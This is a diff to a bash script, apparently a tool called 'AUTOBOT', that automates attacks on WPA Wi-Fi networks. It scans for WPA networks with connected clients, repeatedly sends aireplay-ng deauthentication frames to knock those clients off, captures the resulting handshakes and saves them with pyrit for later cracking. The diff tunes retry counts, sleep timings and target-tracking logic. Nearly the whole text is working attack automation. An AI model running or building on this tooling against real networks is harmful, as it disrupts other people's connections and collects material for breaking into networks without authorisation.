@@ -40,11 +40,11 @@ fbotstart()																#Automagically find active clients and collect new ha
 	echo " [*] CLIENT: "
 	echo " [*] CHANNEL: "
 	echo " [*] POWER: ";$COLOR2 9
-	gnome-terminal --geometry=130x50+0+200 -x airodump-ng mon0 -f 750 -a -w $HOME/tmp -o csv --encrypt WPA&
+	gnome-terminal --geometry=130x50+0+200 -x airodump-ng mon0 -f 500 -a -w $HOME/tmp -o csv --encrypt WPA&
 	DONE=""
 	MNUM=0
 	LNUM=0
-	sort -r $HOME/Desktop/cap/handshakes/got > $HOME/Desktop/cap/handshakes/got2
+	sort -u $HOME/Desktop/cap/handshakes/got > $HOME/Desktop/cap/handshakes/got2
 	mv $HOME/Desktop/cap/handshakes/got2 $HOME/Desktop/cap/handshakes/got
 	modprobe pcspkr
 	fhunt
@@ -101,39 +101,34 @@ fhunt()																	#find new active clients that havn't been handshaked yet
 		then
 			fhunt
 		else
-			if [ "$LASTBSSID" != "$BSSID" ] 2> /dev/null
-				then
-					cat $HOME/tmp-01.csv | grep Station -A 20 | grep ":" | cut -d ',' -f 4,6 | tr -d '(not associated)' > $HOME/tmp4
-					while read LINE
-						do
-							if [ $(echo $LINE | cut -d ',' -f 2) -z ] 2> /dev/null
-								then
-									A=1
-								else
-									echo "$LINE" >> $HOME/tmp5
-							fi
-						done < $HOME/tmp4
-					LASTBSSID=$BSSID
-					POWER=$(cat $HOME/tmp5 | grep $BSSID | head -n 1 | cut -d ',' -f 1)
-					POWER=${POWER:1}
-					CHAN=$(cat $HOME/tmp-01.csv | grep "$BSSID" | grep "WPA" | cut -d ',' -f 4 | head -n 1)
-					CHAN=$((CHAN + 1 - 1))
-					CLIE=$(cat $HOME/tmp-01.csv | grep 'Station' -A 20 | grep "$BSSID" | cut -d ',' -f 1 | head -n 1)
-					clear
-					$COLOR 1;$COLOR2 2;echo " [>] AUTOBOT ENGAGED [<] ";$COLOR 9;$COLOR2 9
-					echo
-					$COLOR 4;echo " [*] Scanning for new active clients.. ";$COLOR 9
-					echo
-					$COLOR 1;echo " [>] EVALUATING TARGET [<] ";$COLOR 9
-					$COLOR2 1;echo " [*] ESSID: $ESSID"
-					echo " [*] BSSID: $BSSID"
-					echo " [*] CLIENT: $CLIE"
-					echo " [*] CHANNEL: $CHAN"
-					echo " [*] POWER: $POWER";$COLOR2 9
-					$COLOR 1;echo " [*] We need this handshake [*] ";$COLOR 9
-					fautocap
-			fi
-			
+			cat $HOME/tmp-01.csv | grep Station -A 20 | grep ":" | cut -d ',' -f 4,6 | tr -d '(not associated)' > $HOME/tmp4
+			while read LINE
+				do
+					if [ $(echo $LINE | cut -d ',' -f 2) -z ] 2> /dev/null
+						then
+							A=1
+						else
+							echo "$LINE" >> $HOME/tmp5
+					fi
+				done < $HOME/tmp4
+			POWER=$(cat $HOME/tmp5 | grep $BSSID | head -n 1 | cut -d ',' -f 1)
+			POWER=${POWER:1}
+			CHAN=$(cat $HOME/tmp-01.csv | grep "$BSSID" | grep "WPA" | cut -d ',' -f 4 | head -n 1)
+			CHAN=$((CHAN + 1 - 1))
+			CLIE=$(cat $HOME/tmp-01.csv | grep 'Station' -A 20 | grep "$BSSID" | cut -d ',' -f 1 | head -n 1)
+			clear
+			$COLOR 1;$COLOR2 2;echo " [>] AUTOBOT ENGAGED [<] ";$COLOR 9;$COLOR2 9
+			echo
+			$COLOR 4;echo " [*] Scanning for new active clients.. ";$COLOR 9
+			echo
+			$COLOR 1;echo " [>] EVALUATING TARGET [<] ";$COLOR 9
+			$COLOR2 1;echo " [*] ESSID: $ESSID"
+			echo " [*] BSSID: $BSSID"
+			echo " [*] CLIENT: $CLIE"
+			echo " [*] CHANNEL: $CHAN"
+			echo " [*] POWER: $POWER";$COLOR2 9
+			$COLOR 1;echo " [*] We need this handshake [*] ";$COLOR 9
+			fautocap
 	fi
 	
 	fhunt
@@ -159,33 +154,34 @@ fautocap()
 			$COLOR 2;$COLOR2 1; echo " [*] DEAUTHING $CLIE [*]";$COLOR 9;$COLOR2 9
 			$COLOR 1;aireplay-ng -0 2 -a $BSSID -c $CLIE mon0;$COLOR 9
 			echo
-			sleep 3
+			sleep 3.5
 			$COLOR 4;echo " [*] Analyzing pcap for handshake [*] ";$COLOR 9
-			sleep 3
 			DONE2=""
 			fanalyze
 			DECNT=$((DECNT + 1))
-			if [ $DECNT -gt 5 ] 2> /dev/null
-				then
-					killall airodump-ng
-					fbotstart
-			fi
+			
 			if [ $GDONE = "1" ] 2> /dev/null
 				then
 					DONE=1
 				else
 					beep -f 100 -l 100
 					beep -f 50 -l 100
-					
 					$COLOR 1; echo " [*] No handshake detected ";$COLOR 9
 					$COLOR 1; echo $ISDONE | grep spread | cut -d ',' -f 2,3,4,5;$COLOR 9
-					sleep 1
+					sleep 0.2
 					DONE=""
+					if [ $DECNT -gt 2 ] 2> /dev/null
+						then
+							killall airodump-ng
+							fbotstart
+					fi
 			fi
+					
 		done
-	beep -f 1300 -l 30 -r 2
-	beep -f 1450 -l 30 -r 1
-	beep -f 1600 -l 60 -r 1
+	beep -f 1200 -l 3 -r 2
+	beep -f 1500 -l 3 -r 1
+	beep -f 1600 -l 5 -r 1
+	beep -f 1800 -l 3 -r 1
 	clear
 	$COLOR 2;$COLOR2 1;echo " [*] Handshake capture was successful!, Horray for AUTOBOT! [*] ";$COLOR 9;$COLOR2 9
 	echo
@@ -200,7 +196,7 @@ fautocap()
 	pyrit -r $HOME/tmp1-01.cap -o "$HOME/Desktop/cap/handshakes/$ESSID-$DATE.cap" strip | grep 'New pcap-file'
 	$COLOR 2;echo $ISDONE | grep spread | cut -d ',' -f 2,3,4,5;$COLOR 9
 	rm -rf $HOME/tmp*
-	sleep 3
+	sleep 2
 	fbotstart
 }		
 
@@ -497,7 +493,6 @@ fhelp()																	#Help
 
 fstart()																#Startup
 {
-	LASTBSSID=";;"
 	COLOR="tput setab"
 	COLOR2="tput setaf"
 	CHKEX=1
